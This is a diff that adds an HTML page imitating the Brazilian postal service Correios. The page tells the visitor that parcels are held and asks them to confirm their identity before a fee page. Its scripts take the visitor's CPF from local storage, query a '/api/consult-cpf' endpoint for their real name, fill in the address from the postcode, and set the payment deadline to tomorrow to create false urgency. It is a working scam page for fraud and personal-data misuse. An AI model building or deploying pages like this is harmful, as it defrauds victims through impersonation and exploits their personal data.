@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Correios | Confirmação</title>
+    <link rel="stylesheet" href="Correios%20_%20Rastreio_arquivos/bootstrap.css">
+    <link rel="stylesheet" href="Correios%20_%20Rastreio_arquivos/app.css">
+    <link rel="stylesheet" href="Correios%20_%20Rastreio_arquivos/yellow.css">
+    <link rel="stylesheet" href="Correios%20_%20Rastreio_arquivos/all.css" crossorigin="anonymous">
+    <link rel="stylesheet" type="text/css" href="css/all.css">
+    <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png">
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17852819586"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+
+        gtag('config', 'AW-17852819586');
+    </script>
+</head>
+
+<body>
+    <header class="w-100 font-size-16 font-weight-400 text-blue">
+        <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
+            <span>Acessibilidade</span>
+        </div>
+        <div class="">
+            <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning"
+                style="height:48px">
+                <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
+                    <a href="#" class="py-2">
+                        <img src="Correios%20_%20Rastreio_arquivos/correios.png" alt="" height="25">
+                    </a>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <h4 class="mt-4 px-2 font-size-18 text-blue-dark font-weight-700 w-95 max-w-1000" style="margin:0 auto;">
+            <span id="userNameTitle">Carregando...</span>, encontramos pedidos retidos em uma de
+            nossas agências.
+        </h4>
+
+        <section class="mt-3 p-4 bg-grey-3 w-95 max-w-1000" style="margin:0 auto;">
+            <div class="p-3" style="background-color: #e9ecef; border-radius: 5px;">
+                <p class="mb-1"><strong>Nome Completo:</strong> <span id="userName">Carregando...</span></p>
+                <p class="mb-1"><strong>CPF:</strong> <span id="userCPF"></span></p>
+                <p class="mb-1"><strong>Rua:</strong> <span id="userStreet">...</span></p>
+                <p class="mb-1"><strong>Cidade:</strong> <span id="userCity">...</span></p>
+                <p class="mb-1"><strong>Estado:</strong> <span id="userState">...</span></p>
+                <p class="mb-0"><strong>PRAZO PARA REGULARIZAÇÃO:</strong> <span id="dueDate">04/02/2026</span></p>
+            </div>
+
+            <div class="text-center mt-4">
+                <p class="font-weight-bold">Esse é você?</p>
+                <a href="taxa.html" class="btn btn-primary text-uppercase px-4 py-2" style="font-weight: bold;">Sim, sou
+                    eu!</a>
+            </div>
+        </section>
+
+        <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
+            <div>
+                <img src="Correios%20_%20Rastreio_arquivos/banner-1.jpg" alt="" class="w-100">
+            </div>
+        </section>
+
+        <script>
+            document.addEventListener('DOMContentLoaded', function () {
+                const cep = localStorage.getItem('userCEP');
+                const cpf = localStorage.getItem('userCPF');
+
+                if (cpf) {
+                    document.getElementById('userCPF').textContent = cpf;
+
+                    fetch('/api/consult-cpf', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ cpf: cpf })
+                    })
+                        .then(response => {
+                            if (!response.ok) {
+                                throw new Error('Network response was not ok');
+                            }
+                            return response.json();
+                        })
+                        .then(data => {
+                            console.log('Dados CPF:', data);
+                            // Extract name from Dtrack or Legendary structure
+                            const realName = (data.consulta && data.consulta.cadastral && data.consulta.cadastral.nome) ||
+                                (data.pessoa && data.pessoa.NOME) ||
+                                (data.pessoa && data.pessoa.nome) ||
+                                data.nome ||
+                                data.name;
+
+                            if (realName) {
+                                // Update both locations
+                                document.getElementById('userNameTitle').textContent = realName;
+                                document.getElementById('userName').textContent = realName;
+
+                                // Save for next pag (taxa.html)
+                                localStorage.setItem('userName', realName);
+                            } else {
+                                throw new Error('Nome não encontrado na resposta');
+                            }
+                        })
+                        .catch(e => {
+                            console.error('Erro ao buscar nome:', e);
+                            const fallbackName = "Destinatário";
+                            document.getElementById('userNameTitle').textContent = fallbackName;
+                            document.getElementById('userName').textContent = fallbackName;
+                            localStorage.setItem('userName', fallbackName);
+                        });
+                }
+
+                if (cep) {
+                    const cleanCep = cep.replace(/\D/g, '');
+                    if (cleanCep.length === 8) {
+                        fetch(`https://viacep.com.br/ws/${cleanCep}/json/`)
+                            .then(response => response.json())
+                            .then(data => {
+                                if (!data.erro) {
+                                    document.getElementById('userStreet').textContent = data.logradouro || 'Endereço não encontrado';
+                                    document.getElementById('userCity').textContent = data.localidade;
+                                    document.getElementById('userState').textContent = data.uf;
+                                }
+                            })
+                            .catch(err => console.error('Erro ao buscar CEP:', err));
+                    }
+                }
+
+                // Update Due Date to tomorrow
+                const tomorrow = new Date();
+                tomorrow.setDate(tomorrow.getDate() + 1);
+                const day = String(tomorrow.getDate()).padStart(2, '0');
+                const month = String(tomorrow.getMonth() + 1).padStart(2, '0');
+                const year = tomorrow.getFullYear();
+                document.getElementById('dueDate').textContent = `${day}/${month}/${year}`;
+            });
+        </script>
+    </main>
+
+    <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark mt-5">
+        <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+            <h5 class="font-weight-700 mb-4">Fale Conosco</h5>
+            <ul>
+                <li class="mb-2 font-size-14">
+                    <i class="fas fa-desktop"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span class="text-wrap">Registro de Manifestações</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-question-square mr-1"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span class="text-wrap">Central de Atendimento</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-briefcase"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span class="text-wrap">Solucões para o seu negócio</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-headset"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span class="text-wrap">Suporte ao cliente com contrato</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-comment-alt-dots"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span>Ouvidoria</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-user-headset"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span>Denúncia</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+
+        <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+            <h5 class="font-weight-700 mb-4">Sobre os Correios</h5>
+            <ul>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-address-card"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span>Identidade colaborativa</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-user-graduate"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span>Educação e cultura</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-book-alt"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span>Código de ética</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-search"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span class="text-wrap">Transparência e prestação de contas</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-comment-alt-dots"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span class="text-wrap">Política de privacidade e Notas legais</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+
+        <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+            <h5 class="font-weight-700 mb-4">Outros Sites</h5>
+            <ul>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-shopping-cart"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span class="text-wrap">Loja online dos correios</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+
+        <div class="d-flex justify-content-center w-100 px-3 mb-3 text-dark font-size-14">
+            <span>© Copyright 2026 Correios</span>
+        </div>
+    </footer>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Load address data from localStorage
+            const street = localStorage.getItem('addressStreet');
+            const city = localStorage.getItem('addressCity');
+            const state = localStorage.getItem('addressState');
+            const cpf = localStorage.getItem('userCPF');
+
+            // Populate fields if data exists
+            if (street) document.getElementById('userStreet').textContent = street;
+            if (city) document.getElementById('userCity').textContent = city;
+            if (state) document.getElementById('userState').textContent = state;
+            if (cpf) document.getElementById('userCPF').textContent = cpf;
+
+            // Fetch name separately if needed, but address is now handled
+        });
+    </script>
+</body>
+
+</html>
